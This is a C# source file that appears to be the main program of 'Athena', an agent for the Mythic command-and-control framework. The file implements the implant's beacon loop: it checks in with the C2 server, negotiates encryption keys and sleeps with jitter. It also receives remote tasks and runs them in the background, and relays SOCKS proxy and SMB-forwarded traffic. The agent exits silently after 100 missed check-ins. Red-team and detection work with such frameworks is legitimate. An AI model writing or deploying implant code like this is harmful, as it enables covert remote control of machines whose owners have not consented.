using Athena.Commands;
using Athena.Utilities;
using System.Collections.Generic;
using System.Threading;
using System.Threading.Tasks;
using System;
using System.Linq;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;

namespace Athena
{
    class Program
    {
        /// <summary>
        /// Main loop
        /// </summary>
        static void Main(string[] args)
        {
            int maxMissedCheckins = 100;
            int missedCheckins = 0;
            bool exit = false;

            //MythicClient controls all of the agent communications
            Globals.mc = new MythicClient();

            //First Checkin-In attempt
            CheckinResponse res = handleCheckin();

            if (!updateAgentInfo(res))
            {
                Environment.Exit(0);
            }

            //We checked in successfully, reset to 0
            missedCheckins = 0;

            //Main Loop
            while (!(missedCheckins == maxMissedCheckins) & !exit)
            {
                try
                {
                    List<MythicJob> hasoutput = Globals.jobs.Values.Where(c => c.hasoutput).ToList();
                    List<DelegateMessage> delegateMessages = Globals.mc.MythicConfig.smbForwarder.GetMessages();
                    List<SocksMessage> socksMessages = Globals.socksHandler.GetMessages();
                    if (!checkAgentTasks(hasoutput, delegateMessages, socksMessages))
                    {
                        missedCheckins += 1;
                        if (missedCheckins == maxMissedCheckins)
                        {
                            Environment.Exit(0);
                        }
                        foreach (var job in hasoutput)
                        {
                            Globals.jobs.Add(job.task.id, job);
                        }
                    }
                    else
                    {
                        missedCheckins = 0;
                        startAgentJobs();
                        clearAgentTasks(hasoutput);
                    }
                }
                catch
                {
                    missedCheckins += 1;
                    if (missedCheckins == maxMissedCheckins)
                    {
                        Environment.Exit(0);
                    }
                }
                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter) * 1000);
            }
        }

        /// <summary>
        /// Perform initial checkin with the Mythic server
        /// </summary>
        private static CheckinResponse handleCheckin()
        {
            int maxMissedCheckins = 100;
            int missedCheckins = 0;
            CheckinResponse res = Globals.mc.CheckIn();

            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
            while (res.status != "success")
            {
                //Attempt checkin again
                try
                {
                    //Increment checkins
                    missedCheckins += 1;

                    if (missedCheckins == maxMissedCheckins)
                    {
                        //bye bye
                        Misc.WriteError("Missed checkins reached.");
                        Environment.Exit(0);
                    }

                    //Keep Trying
                    res = Globals.mc.CheckIn();
                }
                catch (Exception e)
                {
                    Misc.WriteError("[Checkin] " + e.Message);
                    continue;
                }

                //Sleep before attempting checkin again
                Thread.Sleep(Misc.GetSleep(Globals.mc.MythicConfig.sleep, Globals.mc.MythicConfig.jitter));
            }
            return res;
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        private static bool updateAgentInfo(CheckinResponse res)
        {
            try
            {
                Globals.mc.MythicConfig.uuid = res.id;
                if (Globals.mc.MythicConfig.currentConfig.encrypted)
                {
                    if (Globals.mc.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
                    }
                    else
                    {
                        Globals.mc.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, Globals.mc.MythicConfig.currentConfig.psk);
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return false;
            }
        }

        /// <summary>
        /// Perform a check-in with the Mythic server to return current responses and check for new tasks
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        /// <param name="delegateMessages">List of DelegateMessages</param>
        /// <param name="socksMessage">List of SocksMessages</param>
        private static bool checkAgentTasks(List<MythicJob> jobs, List<DelegateMessage> delegateMessages, List<SocksMessage> socksMessage)
        {
            List<MythicTask> tasks = null;
            try
            {
                tasks = Globals.mc.GetTasks(jobs,delegateMessages,socksMessage);
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return false;
            }

            if (tasks is not null)
            {
                foreach (var task in tasks)
                {
                    Globals.jobs.Add(task.id, new MythicJob(task));
                }
                return true;
            }
            else
            {
                return false;
            }
        }

        /// <summary>
        /// Kick off jobs received from the Mythic server
        /// </summary>
        private static bool startAgentJobs()
        {
            try
            {
                foreach (var job in Globals.jobs)
                {
                    if (!job.Value.started)
                    {
                        Task.Run(() =>
                        {
                            try
                            {
                                job.Value.started = true;
                                CommandHandler.StartJob(job.Value);
                            }
                            catch (Exception e)
                            {
                                Misc.WriteDebug(e.Message);
                                job.Value.complete = true;
                                job.Value.hasoutput = true;
                                job.Value.taskresult = e.Message;
                                job.Value.errored = true;
                            }
                        });
                    }
                }
                return true;
            }
            catch (Exception e)
            {
                Misc.WriteError(e.Message);
                return false;
            }
        }

        /// <summary>
        /// Initialize TCP client with a given server IP address and port number
        /// </summary>
        /// <param name="jobs">List of MythicJobs</param>
        private static void clearAgentTasks(List<MythicJob> jobs)
        {
            foreach (var job in jobs)
            {
                try
                {
                    //Check if it's a download or upload job
                    if (!Globals.downloadJobs.ContainsKey(job.task.id) && !Globals.uploadJobs.ContainsKey(job.task.id))
                    {
                        if (job.complete)
                        {
                            Globals.jobs.Remove(job.task.id);
                        }
                        else
                        {
                            string sent = Globals.jobs[job.task.id].taskresult;
                            if (!String.IsNullOrEmpty(Globals.jobs[job.task.id].taskresult))
                            {
                                //Hopefully this fixes the issue with missing text being returned to the server.
                                Globals.jobs[job.task.id].taskresult = Globals.jobs[job.task.id].taskresult.Replace(sent, "");
                            }
                        }
                    }
                }
                catch (Exception e)
                {
                    Misc.WriteDebug(e.Message);
                }
            }
        }
    }
}
